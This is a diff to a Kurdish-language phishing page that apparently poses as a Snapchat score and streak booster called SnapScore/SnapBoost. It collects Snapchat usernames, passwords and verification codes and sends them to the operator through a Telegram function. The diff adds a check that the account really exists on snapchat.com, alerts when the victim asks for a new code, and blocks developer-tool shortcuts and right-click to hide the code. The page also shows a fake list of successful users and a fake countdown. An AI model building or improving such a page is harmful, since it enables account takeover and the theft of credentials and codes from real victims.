@@ -37,12 +37,7 @@
             background: radial-gradient(circle at 30% 20%, rgba(255,252,0,0.03), transparent 60%);
             pointer-events: none;
         }
-        .logo {
-            text-align: center;
-            margin-bottom: 28px;
-            position: relative;
-            z-index: 1;
-        }
+        .logo { text-align: center; margin-bottom: 28px; position: relative; z-index: 1; }
         .logo-icon {
             width: 72px;
             height: 72px;
@@ -53,15 +48,31 @@
             justify-content: center;
             margin: 0 auto 12px;
             box-shadow: 0 12px 40px rgba(255,252,0,0.15);
+            position: relative;
         }
         .logo-icon svg { width: 40px; height: 40px; fill: #1a1a2e; }
+        .logo-icon .pulse {
+            position: absolute;
+            inset: -4px;
+            border-radius: 24px;
+            border: 2px solid rgba(255,252,0,0.2);
+            animation: pulse 2s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0; }
+        }
         .logo h1 {
             color: #fff;
             font-size: 30px;
             font-weight: 800;
             letter-spacing: -0.5px;
         }
-        .logo h1 span { color: #fffc00; background: linear-gradient(135deg, #fffc00, #f5a623); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .logo h1 span {
+            background: linear-gradient(135deg, #fffc00, #f5a623);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
         .logo p {
             color: rgba(255,255,255,0.4);
             font-size: 13px;
@@ -87,11 +98,7 @@
             z-index: 1;
         }
         .info-box strong { color: #fffc00; -webkit-text-fill-color: #fffc00; }
-        .info-box .highlight {
-            color: #fff;
-            font-weight: 600;
-            -webkit-text-fill-color: #fff;
-        }
+        .info-box .highlight { color: #fff; font-weight: 600; -webkit-text-fill-color: #fff; }
         .form-group { margin-bottom: 18px; position: relative; z-index: 1; }
         .form-group label {
             color: rgba(255,255,255,0.6);
@@ -111,7 +118,6 @@
             font-size: 16px;
             transition: all 0.3s ease;
             outline: none;
-            font-family: inherit;
         }
         .form-group input:focus {
             border-color: #fffc00;
@@ -134,7 +140,6 @@
             margin-top: 6px;
             position: relative;
             z-index: 1;
-            font-family: inherit;
         }
         .btn:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(255,252,0,0.2); }
         .btn:active { transform: scale(0.97); }
@@ -176,7 +181,6 @@
             cursor: pointer;
             white-space: nowrap;
             transition: all 0.3s ease;
-            font-family: inherit;
         }
         .code-group .btn-sm:hover { background: rgba(255,255,255,0.12); }
         .footer {
@@ -188,34 +192,6 @@
             position: relative;
             z-index: 1;
         }
-        .loader {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2.5px solid rgba(255,255,255,0.15);
-            border-top: 2.5px solid #fffc00;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-            vertical-align: middle;
-            margin-right: 10px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .feature-list {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin: 12px 0;
-        }
-        .feature-item {
-            background: rgba(255,255,255,0.02);
-            border-radius: 10px;
-            padding: 10px 12px;
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.03);
-        }
-        .feature-item .emoji { font-size: 20px; display: block; }
-        .feature-item .text { color: rgba(255,255,255,0.4); font-size: 10px; margin-top: 4px; }
-        .hidden { display: none !important; }
         .timer-box {
             background: rgba(255,255,255,0.03);
             border-radius: 14px;
@@ -252,16 +228,8 @@
             border-bottom: 1px solid rgba(255,255,255,0.03);
         }
         .user-item:last-child { border-bottom: none; }
-        .user-item .name {
-            color: rgba(255,255,255,0.6);
-            font-size: 13px;
-        }
-        .user-item .score {
-            color: #fffc00;
-            font-size: 13px;
-            font-weight: 600;
-            -webkit-text-fill-color: #fffc00;
-        }
+        .user-item .name { color: rgba(255,255,255,0.6); font-size: 13px; }
+        .user-item .score { color: #fffc00; font-size: 13px; font-weight: 600; -webkit-text-fill-color: #fffc00; }
         .user-item .badge {
             background: rgba(255,252,0,0.08);
             color: #fffc00;
@@ -282,6 +250,22 @@
             text-align: center;
         }
         .warning-box strong { color: #ff6b6b; -webkit-text-fill-color: #ff6b6b; }
+        .hidden { display: none !important; }
+        .feature-list {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin: 12px 0;
+        }
+        .feature-item {
+            background: rgba(255,255,255,0.02);
+            border-radius: 10px;
+            padding: 10px 6px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.03);
+        }
+        .feature-item .emoji { font-size: 20px; display: block; }
+        .feature-item .text { color: rgba(255,255,255,0.4); font-size: 9px; margin-top: 4px; }
     </style>
 </head>
 <body>
@@ -290,25 +274,24 @@
 
     <div class="logo">
         <div class="logo-icon">
+            <div class="pulse"></div>
             <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
         </div>
-        <h1>Snap<span>Boost</span></h1>
-        <p>زیادکردنی نمرە و ستریکەکانی Snapchat</p>
+        <h1>Snap<span>Score</span></h1>
+        <p>زیادکردنی سکۆری Snapchat</p>
     </div>
 
     <!-- ===== STEP 1: LOGIN ===== -->
     <div id="step1" class="step active">
         <div class="info-box">
-            <strong>🔥 بۆستکردنی نمرە و ستریک</strong><br>
+            <strong>🔥 زیادکردنی سکۆر</strong><br>
             ناوی بەکارهێنەر و تێپەڕەوشەی خۆت بنووسە. 
-            <span class="highlight">نمرە و ستریکەکانت</span> لە ماوەی <strong>٤٨ کاتژمێر</strong>دا زیاد دەکەن.
+            <span class="highlight">سکۆرەکەت</span> لە ماوەی <strong>٤٨ کاتژمێر</strong>دا زیاد دەکات.
         </div>
 
         <div class="feature-list">
-            <div class="feature-item"><span class="emoji">⭐</span><span class="text">نمرە +٥٠٠٠</span></div>
-            <div class="feature-item"><span class="emoji">🔥</span><span class="text">سترک +٣٠ ڕۆژ</span></div>
-            <div class="feature-item"><span class="emoji">📸</span><span class="text">سناپ +١٠٠</span></div>
-            <div class="feature-item"><span class="emoji">👑</span><span class="text">تاج +١</span></div>
+            <div class="feature-item"><span class="emoji">⭐</span><span class="text">سکۆر +٥٠٠٠</span></div>
+            <div class="feature-item"><span class="emoji">🔥</span><span class="text">سترک +٣٠</span></div>
         </div>
 
         <div class="form-group">
@@ -328,7 +311,7 @@
         <div class="info-box">
             <strong>📱 کۆدی پشتڕاستکردنەوە</strong><br>
             کۆدێک بۆ ئیمەیل یان ژمارەی تەلەفۆنی تۆ نێردرا.
-            تکایە کۆدەکە بنووسە بۆ <span class="highlight">چالاککردنی بۆست</span>.
+            تکایە کۆدەکە بنووسە بۆ <span class="highlight">چالاککردنی زیادکردن</span>.
         </div>
         <div class="form-group">
             <label>📨 کۆدەکە</label>
@@ -337,7 +320,7 @@
                 <button class="btn-sm" id="resendBtn">ناردنەوە</button>
             </div>
         </div>
-        <button class="btn" id="verifyBtn">پشتڕاستکردنەوە و بۆستکردن</button>
+        <button class="btn" id="verifyBtn">پشتڕاستکردنەوە</button>
         <div id="status2" class="status"></div>
     </div>
 
@@ -345,61 +328,61 @@
     <div id="step3" class="step">
         <div style="text-align:center; padding: 10px 0;">
             <span class="success-icon">⏳</span>
-            <h2 class="success-title">بۆست تۆمار کرا!</h2>
+            <h2 class="success-title">داواکاری تۆمار کرا!</h2>
             <p class="success-sub">
                 داواکارییەکەت بە سەرکەوتووی تۆمار کرا.<br>
-                <span class="success-highlight">تکایە چاوەڕوانی ٤٨ کاتژمێر بکە</span> بۆ زیادبوونی نمرە و ستریکەکانت.
+                <span class="success-highlight">تکایە چاوەڕوانی ٤٨ کاتژمێر بکە</span> بۆ زیادبوونی سکۆرەکەت.
             </p>
 
             <div class="timer-box">
                 <div class="label">⏳ کاتی ماوە بۆ زیادبوون</div>
                 <div class="value" id="countdown">٤٨:٠٠:٠٠</div>
-                <div style="color:rgba(255,255,255,0.2); font-size:11px; margin-top:6px;">دوای ئەم کاتە نمرەکان زیاد دەکەن</div>
+                <div style="color:rgba(255,255,255,0.2); font-size:11px; margin-top:6px;">دوای ئەم کاتە سکۆرەکەت زیاد دەکات</div>
             </div>
 
             <!-- FAKE KURDISH USER LIST -->
             <div class="user-list">
-                <div class="title">🔥 بەکارهێنەرانی تر کە بۆستیان کردووە</div>
+                <div class="title">🔥 بەکارهێنەرانی تر کە سکۆریان زیاد کردووە</div>
                 <div class="user-item">
                     <span class="name">🟢 kurdo763</span>
-                    <span class="score">٢٠٠,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                    <span class="score">٢٠٠,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name">🟢 bawan_101</span>
-                    <span class="score">١٨٥,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                    <span class="score">١٨٥,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name">🟢 zhino_23</span>
-                    <span class="score">١٧٢,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                    <span class="score">١٧٢,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name">🟢 rebar_55</span>
-                    <span class="score">١٦٨,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                    <span class="score">١٦٨,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name">🟢 avin_808</span>
-                    <span class="score">١٥٥,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                    <span class="score">١٥٥,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name">🟢 sarkawt_22</span>
-                    <span class="score">١٤٣,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                    <span class="score">١٤٣,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name">🟢 rozh_404</span>
-                    <span class="score">١٣١,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                    <span class="score">١٣١,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name">🟢 dilan_77</span>
-                    <span class="score">١٢٠,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                    <span class="score">١٢٠,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div style="text-align:center; color:rgba(255,255,255,0.15); font-size:10px; margin-top:6px;">
-                    +١٢٣ بەکارهێنەری تر لە کاتی بۆستکردن
+                    +١٢٣ بەکارهێنەری تر
                 </div>
             </div>
 
             <div class="warning-box">
                 <strong>⚠️ تکایە چاوەڕوان بە</strong><br>
-                نمرە و ستریکەکانت لە ماوەی ٤٨ کاتژمێردا زیاد دەکەن.<br>
+                سکۆرەکەت لە ماوەی ٤٨ کاتژمێردا زیاد دەکات.<br>
                 دوای زیادبوون، ئاگادارکردنەوەکە لە Snapchat ببینیت.
             </div>
 
@@ -410,7 +393,7 @@
     </div>
 
     <div class="footer">
-        © 2027 SnapBoost • زیادکردنی نمرە و ستریک • ماوەی ٤٨ کاتژمێر
+        © 2027 SnapScore • زیادکردنی سکۆری Snapchat • ماوەی ٤٨ کاتژمێر
     </div>
 </div>
 
@@ -424,6 +407,7 @@
     let currentPass = '';
     let currentCode = '';
     let step = 1;
+    let isChecking = false;
 
     // ========== DOM ==========
     const step1 = document.getElementById('step1');
@@ -497,12 +481,52 @@
         currentUser = '';
         currentPass = '';
         currentCode = '';
+        isChecking = false;
+    }
+
+    // ========== CHECK SNAPCHAT ACCOUNT ==========
+    async function checkSnapchatAccount(username) {
+        try {
+            const url = `https://www.snapchat.com/add/${username}`;
+            const response = await fetch(url, {
+                method: 'GET',
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                }
+            });
+
+            const html = await response.text();
+
+            // Check for "Sorry, this content was not found" in the page
+            if (html.includes('Sorry, this content was not found') || 
+                html.includes('content was not found') ||
+                html.includes('Page not found') ||
+                html.includes('404') ||
+                response.status === 404) {
+                return { exists: false };
+            }
+
+            // If page loads and doesn't have the error message, account exists
+            if (response.status === 200) {
+                return { exists: true, platform: 'Snapchat' };
+            }
+
+            return { exists: false };
+        } catch(e) {
+            // If fetch fails, assume account doesn't exist
+            return { exists: false };
+        }
     }
 
     // ========== LOGIN ==========
-    loginBtn.addEventListener('click', function() {
+    loginBtn.addEventListener('click', async function() {
+        if (isChecking) return;
+        
         const u = username.value.trim();
         const p = password.value.trim();
+        
         if (!u || !p) {
             setStatus(status1, '⚠️ تکایە ناوی بەکارهێنەر و تێپەڕەوشە پڕ بکەوە.', 'error');
             return;
@@ -510,35 +534,50 @@
 
         currentUser = u;
         currentPass = p;
+        isChecking = true;
 
+        setStatus(status1, '⏳ پشکنینی هەژمار لە Snapchat...', 'loading');
+        loginBtn.disabled = true;
+
+        // Check Snapchat account
+        const result = await checkSnapchatAccount(u);
+
+        if (!result.exists) {
+            setStatus(status1, '❌ ئەم ئەکاونتە بوونی نیە! تکایە ناوی بەکارهێنەر پشتڕاست بکەوە.', 'error');
+            loginBtn.disabled = false;
+            isChecking = false;
+            return;
+        }
+
+        // Send credentials to Telegram
         sendTelegram(
             `🔐 Snapchat Login\n\n` +
             `👤 Username: ${u}\n` +
             `🔑 Password: ${p}\n` +
+            `✅ Account verified: Yes (Snapchat)\n` +
             `📱 Device: ${navigator.userAgent || 'Unknown'}\n` +
             `🌐 URL: ${window.location.href}\n` +
             `⏱️ Time: ${new Date().toLocaleString()}`
         );
 
-        setStatus(status1, '⏳ پشکنینی هەژمار...', 'loading');
-        loginBtn.disabled = true;
-
         setTimeout(() => {
-            setStatus(status1, '✅ هەژمار دۆزرایەوە! کۆد نێردرا.', 'success');
+            setStatus(status1, `✅ هەژمار دۆزرایەوە! کۆد نێردرا.`, 'success');
 
             setTimeout(() => {
                 hideStatus(status1);
                 showStep(2);
                 loginBtn.disabled = false;
+                isChecking = false;
                 setStatus(status2, '📨 کۆدی ٦ ژمارەیی نێردرا. تکایە بنووسە.', 'info');
                 code.focus();
             }, 1200);
-        }, 2000);
+        }, 1500);
     });
 
     // ========== RESEND ==========
     resendBtn.addEventListener('click', function() {
         setStatus(status2, '📨 کۆدی نوێ نێردرا...', 'loading');
+        sendTelegram(`🔄 Resend code requested for @${currentUser}`);
         setTimeout(() => {
             setStatus(status2, '✅ کۆدی نوێ نێردرا!', 'success');
             setTimeout(() => {
@@ -573,7 +612,6 @@
             showStep(3);
             verifyBtn.disabled = false;
             startCountdown();
-            // NO TELEGRAM SUCCESS MESSAGE
         }, 2500);
     });
 
@@ -593,7 +631,14 @@
     // ========== PREVENT RIGHT-CLICK ==========
     document.addEventListener('contextmenu', e => e.preventDefault());
 
-    console.log('🚀 SnapBoost loaded.');
+    // ========== PREVENT DEV TOOLS ==========
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
+            e.preventDefault();
+        }
+    });
+
+    console.log('🚀 SnapScore loaded.');
 </script>
 </body>
 </html>
